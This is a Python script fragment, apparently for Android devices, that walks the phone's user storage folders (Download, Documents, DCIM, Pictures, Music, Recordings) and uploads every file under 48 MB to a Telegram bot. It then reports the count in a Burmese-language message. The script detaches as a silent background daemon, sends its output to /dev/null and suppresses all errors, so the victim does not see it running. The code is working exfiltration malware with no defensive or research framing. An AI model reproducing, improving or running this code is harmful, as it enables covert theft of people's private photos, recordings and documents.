def send_message(text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": CHAT_ID, "text": text}, timeout=10)
    except:
        pass

def send_document(file_path):
    try:
        if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            with open(file_path, 'rb') as f:
                files = {'document': f}
                data = {"chat_id": CHAT_ID}
                requests.post(url, data=data, files=files, timeout=60)
            time.sleep(1.2)
    except:
        pass

        "/sdcard/Download",
        "/sdcard/Documents",
        "/sdcard/Movies",
        "/sdcard/Music",
        "/sdcard/Recordings",

        "/storage/emulated/0/DCIM",
        "/storage/emulated/0/Pictures",
        "/storage/emulated/0/Download",
        "/storage/emulated/0/Documents"
    ]
    
    processed_files = set()
    total_sent = 0
    
    for directory in storage_directories:
        if os.path.exists(directory):
            for root, dirs, files in os.walk(directory):
                if "Android/data" in root or "Android/obb" in root:
                    continue
                for file in files:
                    file_path = os.path.join(root, file)
                    if file_path not in processed_files:
                        processed_files.add(file_path)
                        try:
                            if os.path.exists(file_path) and os.path.getsize(file_path) < 48 * 1024 * 1024:
                                send_document(file_path)
                                total_sent += 1
                        except:
                            pass
                            
    send_message(f"✅ ဖိုင်များ အားလုံး ပို့ပြီးပါပြီ။ စုစုပေါင်း ပို့လိုက်ရသည့် ဖိုင်အရေအတွက်: {total_sent}")

def run_as_daemon():
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError:
        sys.exit(1)
    
    os.setsid()
    
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError:
        sys.exit(1)
        
    sys.stdout.flush()
    sys.stderr.flush()
    
    null_in = open(os.devnull, 'r')
    null_out = open(os.devnull, 'a+')
    null_err = open(os.devnull, 'a+')
    
    os.dup2(null_in.fileno(), sys.stdin.fileno())
    os.dup2(null_out.fileno(), sys.stdout.fileno())
    os.dup2(null_err.fileno(), sys.stderr.fileno())

if __name__ == "__main__":
    run_as_daemon()
    execute_full_scan()
